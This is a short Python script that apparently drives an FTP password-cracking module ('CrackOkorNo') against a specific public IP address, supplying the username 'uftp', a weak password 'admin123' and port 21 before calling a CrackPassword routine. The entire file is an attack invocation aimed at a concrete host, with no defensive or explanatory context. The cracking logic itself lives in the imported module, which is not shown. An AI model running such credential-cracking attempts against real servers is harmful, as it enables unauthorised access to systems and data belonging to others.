import CrackOkorNo.Server.Crack_FTP

host = "47.93.29.25"
user = "uftp"
password = "admin123"
port = 21
myftp = CrackOkorNo.Server.Crack_FTP.Crack_FTP(host, port, user, password)
myftp.CrackPassword()